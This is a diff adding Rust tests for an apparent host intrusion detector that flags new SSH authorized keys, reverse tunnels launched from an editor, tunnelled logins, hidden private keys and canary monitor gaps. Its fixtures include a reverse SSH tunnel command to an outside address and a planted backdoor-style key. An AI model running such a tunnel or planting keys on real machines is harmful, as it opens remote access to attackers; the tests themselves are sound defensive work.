@@ -690,3 +690,240 @@ fn a_cloned_project_is_checked_once_git_finishes() {
         "{from_reports:?}"
     );
 }
+
+// ------------------------------------------------------------------- SSH
+
+const FIXTURE_KEY: &str =
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPpQFZtq1ipdMtRWzakAiiWvF0rBqugdNwS12wVgQRU";
+
+#[test]
+fn a_key_added_after_the_first_look_is_high_and_survives_restarts() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let file = dir.path().join("authorized_keys");
+    std::fs::write(&file, "").unwrap();
+    let mut source = AuthorizedKeys::new(vec![file.clone()]);
+    assert!(run(&w, &mut source, 100).unwrap().0.is_empty());
+
+    std::fs::write(&file, format!("{FIXTURE_KEY} svc-telemetry\n")).unwrap();
+    let (events, _) = run(&w, &mut source, 102).unwrap();
+    assert_eq!(events.len(), 1);
+    assert_eq!(events[0].severity, Severity::High);
+    assert_eq!(events[0].rule.as_deref(), Some("ssh.key.added"));
+    assert!(events[0].summary.contains("svc-telemetry"));
+    assert!(events[0]
+        .evidence
+        .contains("SHA256:hTOPNSEtBp/y5RTtNxIDaTjZXCkr7kq9wI9L3CFyUXs"));
+    assert!(
+        !events[0].evidence.contains("AAAAC3Nz"),
+        "the key body is never shown"
+    );
+
+    // A restarted daemon remembers the key; nothing changed, nothing reported.
+    let mut restarted = AuthorizedKeys::new(vec![file.clone()]);
+    assert!(run(&w, &mut restarted, 200).unwrap().0.is_empty());
+    // Unchanged files are not reread.
+    assert!(run(&w, &mut restarted, 202).unwrap().0.is_empty());
+
+    std::fs::write(&file, "").unwrap();
+    let (removed, _) = run(&w, &mut restarted, 204).unwrap();
+    assert_eq!(removed[0].severity, Severity::Info);
+}
+
+#[test]
+fn keys_present_at_the_very_first_look_are_listed_not_alarmed() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let file = dir.path().join("authorized_keys");
+    std::fs::write(&file, format!("{FIXTURE_KEY} laptop\n")).unwrap();
+    let (events, _) = run(&w, &mut AuthorizedKeys::new(vec![file]), 100).unwrap();
+    assert_eq!(events.len(), 1);
+    assert_eq!(events[0].severity, Severity::Info);
+    assert_eq!(events[0].rule, None);
+}
+
+impl crate::platform::Processes for Shared<Vec<crate::platform::ProcessEntry>> {
+    fn processes(&self) -> anyhow::Result<Vec<crate::platform::ProcessEntry>> {
+        Ok(self.get())
+    }
+}
+
+fn process(pid: u32, ppid: u32, name: &str, args: &str) -> crate::platform::ProcessEntry {
+    crate::platform::ProcessEntry {
+        pid,
+        ppid,
+        name: name.into(),
+        exe: None,
+        args: args.split(' ').map(String::from).collect(),
+    }
+}
+
+#[test]
+fn a_tunnel_from_an_editor_is_reported_once_per_process() {
+    let w = world();
+    let fake = Shared::default();
+    let mut source = Tunnels::new(Box::new(fake.clone()));
+    let editor = process(100, 1, "cursor", "/opt/cursor/cursor");
+    let host = process(200, 100, "node", "node extensionHost");
+    let tunnel = process(
+        300,
+        200,
+        "ssh",
+        "ssh -N -R *:0:localhost:22 svc@203.0.113.10",
+    );
+    fake.set(vec![editor.clone(), host.clone(), tunnel.clone()]);
+    let (events, _) = run(&w, &mut source, 100).unwrap();
+    assert_eq!(events.len(), 1);
+    assert_eq!(events[0].severity, Severity::High);
+    assert!(events[0].evidence.contains("Started by: node ← cursor"));
+    assert!(
+        run(&w, &mut source, 103).unwrap().0.is_empty(),
+        "still the same process"
+    );
+
+    // autossh restarts ssh: a new pid with the same arguments folds into the first entry.
+    fake.set(vec![
+        editor,
+        host,
+        process(
+            301,
+            200,
+            "ssh",
+            "ssh -N -R *:0:localhost:22 svc@203.0.113.10",
+        ),
+    ]);
+    let (again, _) = run(&w, &mut source, 106).unwrap();
+    assert_eq!(again[0].seen_before, 1);
+
+    // A plain developer tunnel is Review.
+    fake.set(vec![process(
+        400,
+        1,
+        "ssh",
+        "ssh -R 9000:localhost:3000 dev.example.org",
+    )]);
+    assert_eq!(
+        run(&w, &mut source, 109).unwrap().0[0].severity,
+        Severity::Review
+    );
+}
+
+impl crate::platform::Sessions for Shared<Vec<crate::platform::LoginSession>> {
+    fn sessions(&self) -> anyhow::Result<Vec<crate::platform::LoginSession>> {
+        Ok(self.get())
+    }
+}
+
+struct FixedClock {
+    boot: &'static str,
+    asleep: u64,
+}
+impl crate::platform::Clock for FixedClock {
+    fn boot_id(&self) -> Option<String> {
+        Some(self.boot.into())
+    }
+    fn asleep_secs(&self) -> u64 {
+        self.asleep
+    }
+}
+
+fn session(id: &str, remote: Option<&str>) -> crate::platform::LoginSession {
+    crate::platform::LoginSession {
+        id: id.into(),
+        user: "sam".into(),
+        service: if remote.is_some() {
+            "sshd"
+        } else {
+            "gdm-password"
+        }
+        .into(),
+        remote: remote.is_some(),
+        remote_host: remote.map(String::from),
+        remote_user: None,
+        tty: None,
+        class: "user".into(),
+    }
+}
+
+#[test]
+fn network_logins_are_reported_once_and_loopback_ones_are_high() {
+    let w = world();
+    let fake = Shared::default();
+    let clock = || {
+        Box::new(FixedClock {
+            boot: "b1",
+            asleep: 0,
+        })
+    };
+    let mut source = RemoteLogins::new(Box::new(fake.clone()), clock());
+    fake.set(vec![session("2", None), session("7", Some("127.0.0.1"))]);
+    let (events, _) = run(&w, &mut source, 100).unwrap();
+    assert_eq!(
+        events.len(),
+        1,
+        "the desktop session is not a network login"
+    );
+    assert_eq!(events[0].severity, Severity::High);
+    assert!(events[0].evidence.contains("through a tunnel"));
+
+    // A restarted daemon does not report the same session again.
+    let mut restarted = RemoteLogins::new(Box::new(fake.clone()), clock());
+    assert!(run(&w, &mut restarted, 105).unwrap().0.is_empty());
+
+    fake.set(vec![session("8", Some("198.51.100.23"))]);
+    assert_eq!(
+        run(&w, &mut restarted, 110).unwrap().0[0].severity,
+        Severity::Review
+    );
+}
+
+#[test]
+fn private_keys_left_in_temp_folders_are_found_once() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let key = dir.path().join(".stk_0123456789");
+    let header = format!("-----BEGIN {} PRIVATE KEY-----\n", "OPENSSH");
+    std::fs::write(&key, header.repeat(3)).unwrap();
+    std::fs::write(dir.path().join("notes.txt"), "x".repeat(100)).unwrap();
+    let mut source = StrayKeys::new(vec![dir.path().into()]);
+    let (events, _) = run(&w, &mut source, 100).unwrap();
+    assert_eq!(events.len(), 1);
+    assert!(events[0].summary.starts_with("A hidden SSH private key"));
+    assert!(run(&w, &mut source, 130).unwrap().0.is_empty());
+}
+
+#[test]
+fn a_canary_monitor_that_stops_shows_up_as_a_gap() {
+    let w = world();
+    let decoy = tempfile::tempdir().unwrap();
+    crate::checks::canary::create(&w.store, &decoy.path().join("passwords.txt"), None).unwrap();
+    let mut source = Heartbeat::new(Box::new(FixedClock {
+        boot: "b1",
+        asleep: 0,
+    }));
+    let beat = |at: u64| {
+        let mut h: crate::checks::canary::Health = serde_json::from_value(serde_json::json!({
+            "updated": at, "pid": 1, "watched": 1, "configured": 1, "errors": []
+        }))
+        .unwrap();
+        h.updated = at;
+        w.store.write("monitor-health.json", &h).unwrap();
+    };
+    let mut all = vec![];
+    for now in (1000..=1100).step_by(5) {
+        beat(now);
+        all.extend(run(&w, &mut source, now).unwrap().0);
+    }
+    for now in (1105..=1400).step_by(5) {
+        all.extend(run(&w, &mut source, now).unwrap().0);
+    }
+    beat(1405);
+    all.extend(run(&w, &mut source, 1405).unwrap().0);
+    let rules: Vec<_> = all.iter().filter_map(|e| e.rule.as_deref()).collect();
+    assert_eq!(rules, ["monitor.stopped", "monitor.gap"]);
+    assert_eq!(
+        all[1].summary,
+        "Canary monitoring was off for 5 minutes while this computer was awake"
+    );
+    assert!(all.iter().all(|e| e.source == SourceId::Canary));
+}
